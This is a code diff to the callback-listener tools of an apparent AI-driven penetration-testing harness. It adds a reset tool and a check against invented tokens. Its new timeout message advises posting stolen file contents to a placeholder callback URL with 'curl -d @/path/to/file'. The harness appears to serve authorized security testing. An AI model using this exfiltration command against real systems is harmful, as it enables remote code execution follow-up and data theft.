@@ -153,6 +153,34 @@ def start_callback_listener(port: int = 9999, lhost: str = "host.docker.internal
 
 
 @tool
+def reset_callback_listeners() -> dict:
+    """Shut down all active callback listeners and clear token state.
+
+    Call this at the start of a new engagement to avoid stale tokens from
+    prior runs causing confusion.
+
+    Returns:
+        Dict with keys: cleared_tokens, stopped_servers.
+    """
+    cleared = len(_callbacks)
+    _callbacks.clear()
+
+    stopped = 0
+    with _server_lock:
+        for port, server in list(_servers.items()):
+            server.shutdown()
+            stopped += 1
+        _servers.clear()
+
+    logger.info("Reset: cleared %d tokens, stopped %d servers", cleared, stopped)
+    return {
+        "cleared_tokens": cleared,
+        "stopped_servers": stopped,
+        "message": "All callback state cleared. Start a fresh listener for the next exploit.",
+    }
+
+
+@tool
 def check_callback_received(token: str, timeout: int = 10) -> dict:
     """Check whether a callback token has been hit by the target.
 
@@ -165,6 +193,16 @@ def check_callback_received(token: str, timeout: int = 10) -> dict:
     Returns:
         Dict with keys: received (bool), request_body, source_ip, timestamp.
     """
+    if token not in _callbacks:
+        return {
+            "error": True,
+            "received": False,
+            "message": (
+                f"Token '{token}' does not exist. You must call start_callback_listener() "
+                f"first and use the token it returns. Do NOT invent tokens."
+            ),
+        }
+
     deadline = time.time() + timeout
     while time.time() < deadline:
         entry = _callbacks.get(token, {})
@@ -182,5 +220,7 @@ def check_callback_received(token: str, timeout: int = 10) -> dict:
     return {
         "received": False,
         "message": f"No callback received within {timeout}s. "
-        "RCE may have failed or target cannot reach the listener.",
+        "RCE may have failed or target cannot reach the listener. "
+        "Common fix: avoid $() or query-string exfil — use 'curl -d @/path/to/file CALLBACK_URL' "
+        "to POST file contents as the request body instead.",
     }
